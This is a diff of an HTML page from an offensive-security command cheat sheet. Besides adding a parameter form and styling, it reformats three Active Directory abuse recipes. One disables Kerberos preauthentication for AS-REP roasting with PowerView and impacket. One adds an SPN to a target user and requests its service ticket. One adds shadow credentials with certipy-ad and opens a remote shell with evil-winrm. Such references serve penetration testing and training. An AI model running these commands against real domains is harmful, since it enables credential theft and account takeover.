@@ -193,29 +193,152 @@
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="abuse-1--add-uf_dont_require_preauth-bit-to-target-user">Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user</h3>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div></div>
 <h4 id="2-check-target-user">2. Check target user</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="p">&lt;</span><span class="n">TARGET_USER</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">ConvertFrom-UACValue</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainUser &lt;TARGET_USER&gt; | ConvertFrom-UACValue
+</span></span></span></code></pre></div></div>
 <h4 id="3-add-uf_dont_require_preauth-bit">3. Add UF_DONT_REQUIRE_PREAUTH bit</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">TARGET_USER</span><span class="p">&gt;</span> <span class="n">-XOR</span> <span class="vm">@</span><span class="p">{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="mf">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainObject -Identity &lt;TARGET_USER&gt; -XOR @{useraccountcontrol=4194304} -Verbose
+</span></span></span></code></pre></div></div>
 <h4 id="4-as-rep-roasting">4. AS-REP Roasting</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In local linux machine</span>
-</span></span><span class="line"><span class="cl">impacket-GetNPUsers &lt;DOMAIN&gt;/&lt;USER&gt; -no-pass -dc-ip &lt;DC&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In <span class="nb">local</span> linux machine
+</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -no-pass -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div></div>
 </div></p>
 <br>
 <hr>
@@ -225,25 +348,25 @@
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div></div>
 <h4 id="2-create-cred-object-runas-optional">2. Create cred object (runas) [optional]</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;&lt;DOMAIN&gt;\&lt;USER&gt;&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">-typename</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="n">-argumentlist</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString &lt;PASSWORD&gt; -AsPlainText -Force
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
 </span></span></code></pre></div></div>
 <h4 id="3-add-spn">3. Add SPN</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Add spn (e.g. MSSQL)</span>
-</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-a</span> <span class="n">MSSQLSvc</span><span class="p">/</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="err">:</span><span class="mf">1433</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;\&lt;</span><span class="n">TARGET_USER</span><span class="p">&gt;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="p">&lt;</span><span class="n">TARGET_USER</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">serviceprincipalname</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add spn <span class="o">(</span>e.g. MSSQL<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">setspn -a MSSQLSvc/&lt;TARGET_DOMAIN&gt;:1433 &lt;DOMAIN&gt;\&lt;TARGET_USER&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainUser &lt;TARGET_USER&gt; | Select serviceprincipalname
+</span></span></span></code></pre></div></div>
 <h4 id="4-get-spn">4. Get SPN</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainSPNTicket</span> <span class="n">-SPN</span> <span class="s2">&#34;MSSQLSvc/example.com:1433&#34;</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainSPNTicket -SPN &#34;MSSQLSvc/&lt;DOMAIN&gt;:1433&#34; -Credential $Cred
+</span></span></span></code></pre></div></div>
 </div></p>
 <br>
 <hr>
@@ -252,19 +375,20 @@
 <button data-tabset="set3" data-tabcontent="tab1" class="active">Linux</button>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Request a ticket</span>
-</span></span><span class="line"><span class="cl">kinit &lt;USER&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Import ticket</span>
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/tmp/krb5cc_1000
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Pre-check (Optional)</span>
-</span></span><span class="line"><span class="cl">certipy-ad find -username &lt;USER&gt;@&lt;DOMAIN&gt; -k -target &lt;TARGET_DOMAIN&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add shadow credentials</span>
-</span></span><span class="line"><span class="cl">certipy-ad shadow auto -username &lt;USER&gt;@&lt;DOMAIN&gt; -account &lt;TARGET_USER&gt; -k -target &lt;TARGET_DOMAIN&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote with kerberos</span>
-</span></span><span class="line"><span class="cl"><span class="nv">KRB5CCNAME</span><span class="o">=</span>./&lt;TARGET_USER&gt;.ccache evil-winrm -i &lt;TARGET_DOMAIN&gt; -r &lt;DOMAIN&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Request a ticket
+</span></span><span class="line"><span class="cl"><span class="go">kinit &lt;USER&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import ticket
+</span></span><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=/tmp/krb5cc_1000
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Pre-check <span class="o">(</span>Optional<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -username &lt;USER&gt;@&lt;DOMAIN&gt; -k -target &lt;TARGET_DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add shadow credentials
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad shadow auto -username &lt;USER&gt;@&lt;DOMAIN&gt; -account &lt;TARGET_USER&gt; -k -target &lt;TARGET_DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote with kerberos
+</span></span><span class="line"><span class="cl"><span class="go">KRB5CCNAME=./&lt;TARGET_USER&gt;.ccache evil-winrm -i &lt;TARGET_DOMAIN&gt; -r &lt;DOMAIN&gt;
+</span></span></span></code></pre></div></div>
 </div></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
